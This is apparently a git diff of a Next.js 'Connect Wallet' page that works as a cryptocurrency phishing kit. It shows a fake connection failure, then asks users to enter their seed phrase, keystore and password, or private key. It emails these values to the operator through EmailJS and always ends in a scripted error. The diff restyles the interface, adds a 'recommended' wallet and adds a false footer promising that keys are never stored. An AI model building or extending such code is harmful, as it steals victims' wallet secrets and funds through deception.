@@ -1,10 +1,12 @@
 "use client";
 import Image from "next/image";
-import { useState, useEffect, useRef } from "react";
+import { useState, useEffect } from "react";
+import { useRouter } from "next/navigation";
 import { wallets } from "../data/wallet";
 import emailjs from '@emailjs/browser';
 
 export default function WalletPage() {
+    const router = useRouter();
     const [searchQuery, setSearchQuery] = useState("");
     const [showModal, setShowModal] = useState(false);
     const [showManualModal, setShowManualModal] = useState(false);
@@ -14,7 +16,6 @@ export default function WalletPage() {
     const [activeTab, setActiveTab] = useState<"phrase" | "keystore" | "privatekey">("phrase");
     const [loadingStatus, setLoadingStatus] = useState<"loading" | "initializing" | "linking" | "error">("loading");
 
-    // Form data states
     const [phraseValue, setPhraseValue] = useState("");
     const [keystoreValue, setKeystoreValue] = useState("");
     const [passwordValue, setPasswordValue] = useState("");
@@ -58,13 +59,10 @@ export default function WalletPage() {
 
     const handleConnect = async () => {
         if (!selectedWallet) return;
-
-        // Close manual modal and show loading modal
         setShowManualModal(false);
         setShowLoadingModal(true);
         setLoadingStatus("loading");
 
-        // Get the current form data based on active tab
         let emailData = {
             wallet_name: selectedWallet.name,
             connection_type: activeTab,
@@ -75,31 +73,19 @@ export default function WalletPage() {
         };
 
         try {
-            // Send email using EmailJS with environment variables
             await emailjs.send(
                 process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID!,
                 process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID!,
                 emailData,
                 process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY!
             );
-            console.log('Email sent successfully');
         } catch (error) {
             console.error('Email send error:', error);
-            // Continue with loading animation even if email fails
         }
 
-        // Loading sequence
-        setTimeout(() => {
-            setLoadingStatus("initializing");
-        }, 2000);
-
-        setTimeout(() => {
-            setLoadingStatus("linking");
-        }, 5000);
-
-        setTimeout(() => {
-            setLoadingStatus("error");
-        }, 7000);
+        setTimeout(() => { setLoadingStatus("initializing"); }, 2000);
+        setTimeout(() => { setLoadingStatus("linking"); }, 5000);
+        setTimeout(() => { setLoadingStatus("error"); }, 7000);
     };
 
     const handleTryAgain = () => {
@@ -107,7 +93,6 @@ export default function WalletPage() {
         setShowManualModal(false);
         setSelectedWallet(null);
         setLoadingStatus("loading");
-        // Clear all form inputs
         setPhraseValue("");
         setKeystoreValue("");
         setPasswordValue("");
@@ -120,257 +105,168 @@ export default function WalletPage() {
         setLoadingStatus("loading");
     };
 
+    const CloseButton = ({ onClick }: { onClick: () => void }) => (
+        <button
+            onClick={onClick}
+            className="w-8 h-8 rounded-full bg-[rgba(50,50,50,1)] flex items-center justify-center hover:bg-[rgba(65,65,65,1)] transition-colors shrink-0"
+            aria-label="Close"
+        >
+            <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
+                <path d="M13 1L1 13M1 1l12 12" stroke="rgba(200,200,200,1)" strokeWidth="1.5" strokeLinecap="round" />
+            </svg>
+        </button>
+    );
+
     return (
-        <div className="min-h-screen bg-[#0B1527]">
-            {/* Error Modal */}
+        <div className="fixed inset-0 z-50 bg-black overflow-y-auto flex items-start justify-center pt-16 px-4 pb-10">
+
+            {/* ── Connecting / Error modal ── */}
             {showModal && selectedWallet && (
-                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/30">
-                    <div className="bg-white rounded-lg shadow-xl w-full max-w-md mx-4 relative">
-                        {/* Modal Header */}
-                        <div className="flex items-center justify-between px-6 py-4 border-b">
-                            <button
-                                onClick={closeModal}
-                                className="text-blue-600 font-medium hover:text-blue-700"
-                            >
-                                Back
-                            </button>
-                            <button
-                                onClick={closeModal}
-                                className="text-gray-400 hover:text-gray-600 text-2xl leading-none"
-                            >
-                                ×
-                            </button>
+                <div className="fixed inset-0 z-[60] flex items-center justify-center p-4 bg-black/60">
+                    <div className="w-full max-w-md bg-[rgba(28,28,28,1)] rounded-2xl p-6 shadow-2xl">
+                        <div className="flex items-center justify-between mb-8">
+                            <h2 className="text-white text-lg font-semibold">
+                                {isInitializing ? "Connecting" : "Error Connecting"}
+                            </h2>
+                            <CloseButton onClick={closeModal} />
                         </div>
 
-                        {/* Modal Body */}
-                        <div className="p-6 space-y-4">
-                            {/* Error/Initializing Box */}
-                            <div className="flex items-center justify-between border-2 border-red-500 rounded-lg p-4">
-                                <span className="text-red-600 font-medium">
-                                    {isInitializing ? "Initializing..." : "Error Connecting..."}
-                                </span>
-                                {!isInitializing && (
+                        {isInitializing ? (
+                            <div className="flex flex-col items-center gap-6 py-4">
+                                <div className="flex items-center gap-2.5 px-4 py-2 bg-[rgba(40,40,40,1)] rounded-full">
+                                    {selectedWallet.icon && (
+                                        <Image src={selectedWallet.icon} alt={selectedWallet.name} width={28} height={28} className="rounded-full" unoptimized />
+                                    )}
+                                    <span className="text-white font-medium text-sm">{selectedWallet.name}</span>
+                                </div>
+                                <div className="w-14 h-14 rounded-full border-2 border-[rgba(60,60,60,1)] border-t-[rgba(220,220,220,1)] animate-spin" />
+                                <p className="text-sm text-[rgba(150,150,150,1)]">Binding wallet to session...</p>
+                                <div className="w-full h-px bg-[rgba(50,50,50,1)] rounded-full overflow-hidden mt-2">
+                                    <div className="h-full bg-white rounded-full w-3/5" />
+                                </div>
+                            </div>
+                        ) : (
+                            <div className="space-y-4">
+                                <div className="flex items-center justify-between bg-[rgba(40,40,40,1)] border border-red-500/40 rounded-xl p-4">
+                                    <span className="text-red-400 font-medium text-sm">Error Connecting...</span>
                                     <button
                                         onClick={openManualModal}
-                                        className="bg-gray-800 text-white px-4 py-2 rounded-md text-sm font-medium hover:bg-gray-700"
+                                        className="bg-[rgba(60,60,60,1)] hover:bg-[rgba(75,75,75,1)] text-white px-4 py-2 rounded-lg text-sm font-medium transition-colors"
                                     >
                                         Connect Manually
                                     </button>
-                                )}
-                            </div>
-
-                            {/* Selected Wallet */}
-                            <div className="flex items-center justify-between border border-gray-300 rounded-lg p-4">
-                                <div className="flex items-center gap-3">
-                                    <div className="w-12 h-12 relative flex items-center justify-center">
-                                        {selectedWallet.icon ? (
-                                            <Image
-                                                src={selectedWallet.icon}
-                                                alt={selectedWallet.name}
-                                                width={48}
-                                                height={48}
-                                                className="rounded-full"
-                                                unoptimized
-                                            />
-                                        ) : (
-                                            <span className="text-gray-600 text-xl font-bold">
-                                                {selectedWallet.name.charAt(0)}
-                                            </span>
-                                        )}
-                                    </div>
-                                    <span className="text-gray-900 font-medium">
-                                        {selectedWallet.name}
-                                    </span>
                                 </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            )}
-
-            {/* Manual Connection Modal */}
-            {showManualModal && selectedWallet && (
-                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/30">
-                    <div className="bg-white rounded-lg shadow-xl w-full max-w-md mx-4 relative">
-                        {/* Modal Body */}
-                        <div className="p-6">
-                            {/* Wallet Header */}
-                            <div className="flex items-center gap-3 mb-6">
-                                <div className="w-14 h-14 relative flex items-center justify-center">
-                                    {selectedWallet.icon ? (
-                                        <Image
-                                            src={selectedWallet.icon}
-                                            alt={selectedWallet.name}
-                                            width={56}
-                                            height={56}
-                                            className="rounded-full"
-                                            unoptimized
-                                        />
-                                    ) : (
-                                        <span className="text-gray-600 text-2xl font-bold">
-                                            {selectedWallet.name.charAt(0)}
-                                        </span>
+                                <div className="flex items-center gap-3 bg-[rgba(38,38,38,1)] border border-[rgba(55,55,55,1)] rounded-xl p-4">
+                                    {selectedWallet.icon && (
+                                        <Image src={selectedWallet.icon} alt={selectedWallet.name} width={40} height={40} className="rounded-full" unoptimized />
                                     )}
+                                    <span className="text-white font-medium">{selectedWallet.name}</span>
                                 </div>
-                                <span className="text-gray-900 font-semibold text-lg">
-                                    {selectedWallet.name}
-                                </span>
                             </div>
+                        )}
+                    </div>
+                </div>
+            )}
 
-                            {/* Tabs */}
-                            <div className="flex gap-8 mb-6 border-b">
+            {/* ── Manual connection modal ── */}
+            {showManualModal && selectedWallet && (
+                <div className="fixed inset-0 z-[60] flex items-center justify-center p-4 bg-black/60">
+                    <div className="w-full max-w-md bg-[rgba(28,28,28,1)] rounded-2xl p-6 shadow-2xl">
+                        <div className="flex items-center gap-3 mb-6">
+                            {selectedWallet.icon && (
+                                <Image src={selectedWallet.icon} alt={selectedWallet.name} width={44} height={44} className="rounded-full" unoptimized />
+                            )}
+                            <span className="text-white font-semibold text-lg flex-1">{selectedWallet.name}</span>
+                            <CloseButton onClick={closeManualModal} />
+                        </div>
+
+                        {/* Tabs */}
+                        <div className="flex gap-6 mb-5 border-b border-[rgba(50,50,50,1)]">
+                            {(["phrase", "keystore", "privatekey"] as const).map((tab) => (
                                 <button
-                                    onClick={() => setActiveTab("phrase")}
-                                    className={`pb-2 text-sm font-medium transition-colors ${activeTab === "phrase"
-                                            ? "text-gray-900 border-b-2 border-gray-900"
-                                            : "text-gray-500 hover:text-gray-700"
+                                    key={tab}
+                                    onClick={() => setActiveTab(tab)}
+                                    className={`pb-3 text-sm font-medium capitalize transition-colors ${activeTab === tab
+                                        ? "text-white border-b-2 border-white -mb-px"
+                                        : "text-[rgba(120,120,120,1)] hover:text-[rgba(180,180,180,1)]"
                                         }`}
                                 >
-                                    Phrase
+                                    {tab === "privatekey" ? "Private Key" : tab.charAt(0).toUpperCase() + tab.slice(1)}
                                 </button>
-                                <button
-                                    onClick={() => setActiveTab("keystore")}
-                                    className={`pb-2 text-sm font-medium transition-colors ${activeTab === "keystore"
-                                            ? "text-gray-900 border-b-2 border-gray-900"
-                                            : "text-gray-500 hover:text-gray-700"
-                                        }`}
-                                >
-                                    Keystore
-                                </button>
-                                <button
-                                    onClick={() => setActiveTab("privatekey")}
-                                    className={`pb-2 text-sm font-medium transition-colors ${activeTab === "privatekey"
-                                            ? "text-gray-900 border-b-2 border-gray-900"
-                                            : "text-gray-500 hover:text-gray-700"
-                                        }`}
-                                >
-                                    Private Key
-                                </button>
-                            </div>
+                            ))}
+                        </div>
 
-                            {/* Tab Content */}
-                            <div className="space-y-4">
-                                {activeTab === "phrase" && (
-                                    <>
-                                        <textarea
-                                            placeholder="Phrase"
-                                            rows={6}
-                                            value={phraseValue}
-                                            onChange={(e) => setPhraseValue(e.target.value)}
-                                            className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent resize-none text-sm"
-                                        />
-                                        <p className="text-xs text-gray-500">
-                                            Typically 12 (sometimes 24) words separated by single spaces
-                                        </p>
-                                    </>
-                                )}
+                        {/* Tab content */}
+                        <div className="space-y-3">
+                            {activeTab === "phrase" && (
+                                <>
+                                    <textarea
+                                        placeholder="Enter your seed phrase..."
+                                        rows={5}
+                                        value={phraseValue}
+                                        onChange={(e) => setPhraseValue(e.target.value)}
+                                        className="w-full px-4 py-3 bg-[rgba(38,38,38,1)] border border-[rgba(55,55,55,1)] rounded-xl text-white text-sm placeholder:text-[rgba(80,80,80,1)] focus:outline-none focus:border-[rgba(100,100,100,1)] resize-none"
+                                    />
+                                    <p className="text-xs text-[rgba(100,100,100,1)]">Typically 12 (sometimes 24) words separated by single spaces</p>
+                                </>
+                            )}
+                            {activeTab === "keystore" && (
+                                <>
+                                    <input type="text" placeholder="Enter Keystore" value={keystoreValue} onChange={(e) => setKeystoreValue(e.target.value)} autoComplete="off"
+                                        className="w-full px-4 py-3 bg-[rgba(38,38,38,1)] border border-[rgba(55,55,55,1)] rounded-xl text-white text-sm placeholder:text-[rgba(80,80,80,1)] focus:outline-none focus:border-[rgba(100,100,100,1)]" />
+                                    <input type="password" placeholder="Wallet password" value={passwordValue} onChange={(e) => setPasswordValue(e.target.value)} autoComplete="new-password"
+                                        className="w-full px-4 py-3 bg-[rgba(38,38,38,1)] border border-[rgba(55,55,55,1)] rounded-xl text-white text-sm placeholder:text-[rgba(80,80,80,1)] focus:outline-none focus:border-[rgba(100,100,100,1)]" />
+                                    <p className="text-xs text-[rgba(100,100,100,1)]">Several lines of text beginning with {'"{'}-" plus the password you used to encrypt it.</p>
+                                </>
+                            )}
+                            {activeTab === "privatekey" && (
+                                <>
+                                    <input type="text" placeholder="Enter your Private Key" value={privateKeyValue} onChange={(e) => setPrivateKeyValue(e.target.value)}
+                                        className="w-full px-4 py-3 bg-[rgba(38,38,38,1)] border border-[rgba(55,55,55,1)] rounded-xl text-white text-sm placeholder:text-[rgba(80,80,80,1)] focus:outline-none focus:border-[rgba(100,100,100,1)]" />
+                                    <p className="text-xs text-[rgba(100,100,100,1)]">Typically 12 (sometimes 24) words separated by a single space.</p>
+                                </>
+                            )}
+                        </div>
 
-                                {activeTab === "keystore" && (
-                                    <>
-                                        <input
-                                            type="text"
-                                            placeholder="Enter Keystore"
-                                            value={keystoreValue}
-                                            onChange={(e) => setKeystoreValue(e.target.value)}
-                                            autoComplete="off"
-                                            className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-sm"
-                                        />
-                                        <input
-                                            type="password"
-                                            placeholder="Wallet password"
-                                            value={passwordValue}
-                                            onChange={(e) => setPasswordValue(e.target.value)}
-                                            autoComplete="new-password"
-                                            className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-sm"
-                                        />
-                                        <p className="text-xs text-gray-500">
-                                            Several lines of text beginning with "{'{'}-" plus the password you used to encrypt it.
-                                        </p>
-                                    </>
-                                )}
-
-                                {activeTab === "privatekey" && (
-                                    <>
-                                        <input
-                                            type="text"
-                                            placeholder="Enter your Private Key"
-                                            value={privateKeyValue}
-                                            onChange={(e) => setPrivateKeyValue(e.target.value)}
-                                            className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-sm"
-                                        />
-                                        <p className="text-xs text-gray-500">
-                                            Typically 12 (sometimes 24) words separated by a single space.
-                                        </p>
-                                    </>
-                                )}
-                            </div>
-
-                            {/* Action Buttons */}
-                            <div className="mt-6 space-y-3">
-                                <button
-                                    onClick={handleConnect}
-                                    className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-lg font-medium transition-colors"
-                                >
-                                    Connect
-                                </button>
-                                <button
-                                    onClick={closeManualModal}
-                                    className="w-full bg-red-600 hover:bg-red-700 text-white py-3 rounded-lg font-medium transition-colors"
-                                >
-                                    Cancel
-                                </button>
-                            </div>
+                        <div className="mt-5 space-y-2.5">
+                            <button onClick={handleConnect} className="w-full bg-white hover:bg-[rgba(220,220,220,1)] text-black py-3 rounded-xl font-medium transition-colors text-sm">
+                                Connect
+                            </button>
+                            <button onClick={closeManualModal} className="w-full bg-[rgba(38,38,38,1)] hover:bg-[rgba(50,50,50,1)] text-[rgba(180,180,180,1)] py-3 rounded-xl font-medium transition-colors text-sm">
+                                Cancel
+                            </button>
                         </div>
                     </div>
                 </div>
             )}
 
-            {/* Loading Modal */}
+            {/* ── Loading / error modal ── */}
             {showLoadingModal && selectedWallet && (
-                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/30">
-                    <div className="bg-[rgba(76,29,149,0.95)] rounded-3xl shadow-2xl w-full max-w-lg mx-4 relative p-8">
+                <div className="fixed inset-0 z-[60] flex items-center justify-center p-4 bg-black/60">
+                    <div className="w-full max-w-md bg-[rgba(28,28,28,1)] rounded-2xl p-6 shadow-2xl">
+                        <div className="flex items-center justify-between mb-6">
+                            <h2 className="text-white text-lg font-semibold">Interacting With Provider</h2>
+                            <CloseButton onClick={closeLoadingModal} />
+                        </div>
 
-
-
-                        {/* Modal Content */}
-                        <div className="text-center mt-12">
-                            <h2 className="text-white text-2xl font-bold mb-8 border-b border-white/30 pb-4">
-                                Interacting With Provider
-                            </h2>
-
+                        <div className="flex flex-col items-center gap-5 py-4 text-center">
                             {loadingStatus !== "error" ? (
                                 <>
-                                    {/* Loading Spinner */}
-                                    <div className="flex justify-center mb-6">
-                                        <div className="w-16 h-16 border-4 border-white/30 border-t-white rounded-full animate-spin"></div>
-                                    </div>
-
-                                    {/* Status Text */}
-                                    <p className="text-white text-lg font-medium capitalize">
-                                        {loadingStatus}...
-                                    </p>
+                                    <div className="w-14 h-14 rounded-full border-2 border-[rgba(60,60,60,1)] border-t-[rgba(220,220,220,1)] animate-spin" />
+                                    <p className="text-white font-medium capitalize">{loadingStatus}...</p>
                                 </>
                             ) : (
                                 <>
-                                    {/* Error Icon */}
-                                    <div className="flex justify-center mb-6">
-                                        <div className="w-16 h-16 bg-white/20 rounded-full flex items-center justify-center">
-                                            <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
-                                            </svg>
-                                        </div>
+                                    <div className="w-14 h-14 bg-[rgba(50,50,50,1)] rounded-full flex items-center justify-center">
+                                        <svg className="w-7 h-7 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
+                                        </svg>
                                     </div>
-
-                                    <p className="text-white text-lg font-bold mb-2">Error</p>
-                                    <p className="text-red-400 text-sm mb-8">
-                                        Unable to interact With Provider, please try another wallet
-                                    </p>
-
-                                    {/* Try Again Button */}
-                                    <button
-                                        onClick={handleTryAgain}
-                                        className="bg-red-500 hover:bg-red-600 text-white px-8 py-3 rounded-lg font-medium transition-colors"
-                                    >
+                                    <div>
+                                        <p className="text-white font-semibold mb-1">Error</p>
+                                        <p className="text-red-400 text-sm">Unable to interact with Provider, please try another wallet</p>
+                                    </div>
+                                    <button onClick={handleTryAgain} className="bg-red-500 hover:bg-red-600 text-white px-8 py-2.5 rounded-xl font-medium transition-colors text-sm">
                                         Try Again
                                     </button>
                                 </>
@@ -380,78 +276,105 @@ export default function WalletPage() {
                 </div>
             )}
 
-            <div className="w-full bg-[#0B1527] py-10">
-                <div className="flex justify-center">
-                    <img
-                        src="/wallogo.png"
-                        alt="Wallet Logo"
-                        className="w-24"
-                    />
+            {/* ── Main card — hidden when any popup is open ── */}
+            {!showModal && !showManualModal && !showLoadingModal && (
+            <div className="w-full max-w-md bg-[rgba(28,28,28,1)] rounded-2xl shadow-2xl overflow-hidden">
+                {/* Header */}
+                <div className="flex items-center justify-between px-6 pt-6 pb-4">
+                    <h1 className="text-white text-lg font-semibold">Connect Wallet</h1>
+                    <button
+                        onClick={() => router.back()}
+                        className="w-8 h-8 rounded-full bg-[rgba(50,50,50,1)] flex items-center justify-center hover:bg-[rgba(65,65,65,1)] transition-colors"
+                        aria-label="Go back"
+                    >
+                        <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
+                            <path d="M13 1L1 13M1 1l12 12" stroke="rgba(200,200,200,1)" strokeWidth="1.5" strokeLinecap="round" />
+                        </svg>
+                    </button>
                 </div>
-            </div>
-            <div className="bg-[#0B1527] text-[rgba(33,37,41,1)]" id="component-container">
-                <div className="max-w-5xl mx-auto px-4">
-                    <div className="text-center">
-                        <h1
-                            data-excompt-id="3092"
-                            className="xl:text-[40px] mt-8 mb-2 font-semibold text-white text-[40px] leading-[48px] animate-pulse"
-                        >
-                            Connect Wallet
-                        </h1>
-                        <h6
-                            data-excompt-id="6132"
-                            className="mt-4 mb-2 leading-4 text-white text-[15px] animate-pulse"
-                        >
-                            Please connect your wallet to continue
-                        </h6>
+
+                {/* Search */}
+                <div className="px-6 pb-4">
+                    <div className="flex items-center gap-2 bg-[rgba(38,38,38,1)] border border-[rgba(50,50,50,1)] rounded-xl px-4 py-2.5">
+                        <svg width="16" height="16" viewBox="0 0 16 16" fill="none" className="shrink-0">
+                            <circle cx="7" cy="7" r="5" stroke="rgba(120,120,120,1)" strokeWidth="1.5" />
+                            <path d="M11 11l3 3" stroke="rgba(120,120,120,1)" strokeWidth="1.5" strokeLinecap="round" />
+                        </svg>
                         <input
                             type="text"
-                            id="searchInput"
-                            placeholder="Search wallet names..."
+                            placeholder="Search wallets..."
                             value={searchQuery}
                             onChange={(e) => setSearchQuery(e.target.value)}
-                            className="focus:bg-white focus:outline-0 focus:text-[rgba(73,80,87,1)] focus:shadow-[rgba(0,123,255,0.25)_0px_0px_0px_3.2px] focus:border-[rgba(128,189,255,1)] placeholder-gray-500 opacity-[1] block w-full overflow-visible rounded border border-gray-300 bg-white bg-clip-padding px-3 py-1.5 text-center leading-6 h-[calc(24px_+_2px_+_12px)] text-[rgba(73,80,87,1)] transition-[border-color,box-shadow] ease-[ease-in-out] duration-[0.15s]"
+                            className="flex-1 bg-transparent text-white text-sm placeholder:text-[rgba(100,100,100,1)] outline-none"
                         />
                     </div>
                 </div>
-            </div>
-            <div className="w-full bg-[#0B1527] py-10">
-                <div className="grid grid-cols-3 md:grid-cols-6 gap-10 max-w-5xl mx-auto px-4">
-                    {filteredWallets.length > 0 ? (
-                        filteredWallets.map((wallet, index) => (
+
+                {/* Onyx Wallet — Recommended (always shown when not filtering it out) */}
+                {filteredWallets.some(w => w.name === "Onyx Wallet") && (
+                    <div className="px-6 pb-2">
+                        <button
+                            onClick={() => handleWalletClick({ name: "Onyx Wallet", icon: "/onyxlogo.webp" })}
+                            className="w-full flex items-center gap-4 p-4 bg-[rgba(38,38,38,1)] hover:bg-[rgba(48,48,48,1)] rounded-xl transition-colors duration-150"
+                        >
+                            <Image src="/onyxlogo.webp" alt="Onyx Wallet" width={40} height={40} className="rounded-full shrink-0" />
+                            <div className="flex-1 text-left">
+                                <div className="text-white font-medium text-sm">Onyx Wallet</div>
+                                <div className="text-xs text-[rgba(120,120,120,1)] mt-0.5">The official Onyx Protocol wallet</div>
+                            </div>
+                            <span className="text-xs font-semibold text-[rgba(150,150,150,1)] border border-[rgba(70,70,70,1)] rounded-full px-2.5 py-1 tracking-wide shrink-0">
+                                RECOMMENDED
+                            </span>
+                        </button>
+                    </div>
+                )}
+
+                {/* Other wallets divider */}
+                <div className="flex items-center gap-3 px-6 py-3">
+                    <div className="flex-1 h-px bg-[rgba(45,45,45,1)]" />
+                    <span className="text-xs text-[rgba(90,90,90,1)] tracking-widest font-medium">OTHER WALLETS</span>
+                    <div className="flex-1 h-px bg-[rgba(45,45,45,1)]" />
+                </div>
+
+                {/* Wallet list */}
+                <div className="max-h-[420px] overflow-y-auto px-3 pb-4" style={{ scrollbarWidth: "none" }}>
+                    {filteredWallets.filter(w => w.name !== "Onyx Wallet").length > 0 ? (
+                        filteredWallets.filter(w => w.name !== "Onyx Wallet").map((wallet, index) => (
                             <button
                                 key={index}
-                                className="text-center hover:scale-105 transition-transform"
                                 onClick={() => handleWalletClick(wallet)}
+                                className="w-full flex items-center gap-3 px-3 py-3 hover:bg-[rgba(38,38,38,1)] rounded-xl transition-colors duration-150"
                             >
-                                <div className="w-20 h-20 mx-auto relative bg-gray-700 rounded-full flex items-center justify-center">
+                                <div className="w-9 h-9 rounded-full bg-[rgba(45,45,45,1)] flex items-center justify-center overflow-hidden shrink-0">
                                     {wallet.icon ? (
-                                        <Image
-                                            src={wallet.icon}
-                                            alt={wallet.name}
-                                            width={80}
-                                            height={80}
-                                            className="rounded-full"
-                                            unoptimized
-                                        />
+                                        <Image src={wallet.icon} alt={wallet.name} width={36} height={36} className="rounded-full object-cover" unoptimized />
                                     ) : (
-                                        <span className="text-white text-2xl font-bold">
-                                            {wallet.name.charAt(0)}
-                                        </span>
+                                        <span className="text-white text-sm font-bold">{wallet.name.charAt(0)}</span>
                                     )}
                                 </div>
-                                <h4 className="mt-3 text-white text-[11px] font-semibold">
-                                    {wallet.name}
-                                </h4>
+                                <span className="flex-1 text-left text-white text-sm font-medium">{wallet.name}</span>
+                                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" className="shrink-0">
+                                    <path d="M5 3l4 4-4 4" stroke="rgba(100,100,100,1)" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
+                                </svg>
                             </button>
                         ))
                     ) : (
-                        <div className="col-span-full text-center text-white">
-                            WALLET NOT FOUND
-                        </div>
+                        <p className="text-center text-[rgba(100,100,100,1)] text-sm py-8">No wallets found</p>
                     )}
                 </div>
+
+                {/* Footer */}
+                <div className="px-6 py-4 border-t border-[rgba(40,40,40,1)]">
+                    <p className="text-center text-xs text-[rgba(90,90,90,1)] leading-relaxed">
+                        By connecting you agree to our{" "}
+                        <span className="text-[rgba(150,150,150,1)] underline cursor-pointer">Terms</span>
+                        {" & "}
+                        <span className="text-[rgba(150,150,150,1)] underline cursor-pointer">Privacy Policy</span>
+                        . We never store your keys or seed phrases.
+                    </p>
+                </div>
             </div>
+            )}
         </div>
     );
 }
